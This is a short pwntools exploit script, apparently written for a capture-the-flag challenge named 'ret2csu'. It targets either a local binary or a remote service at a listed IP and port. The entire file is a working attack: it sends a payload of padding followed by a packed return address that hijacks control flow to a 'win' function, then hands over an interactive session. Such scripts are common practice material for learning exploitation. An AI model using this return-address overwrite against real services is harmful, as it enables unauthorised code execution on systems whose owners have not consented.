#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context.arch = 'amd64'

local = 1

if local:
	cn = process('./ret2csu')
	# bin = ELF('./task_shoppingCart',checksec=False)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	# libc = ELF('/lib/i386-linux-gnu/libc.so.6',checksec=False)

else:
	cn = remote('117.78.27.105', 30403)
	# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
	pass


def z(a=''):
	if local:
		gdb.attach(cn,a)
		if a == '':
			raw_input()

win_add = 0x04007B1
cn.recvuntil('beef')
z('b*0x04007AF\nc')

payload = 'A'*0x20+ p64(0) + p64(win_add)

cn.sendline(payload)

cn.interactive()
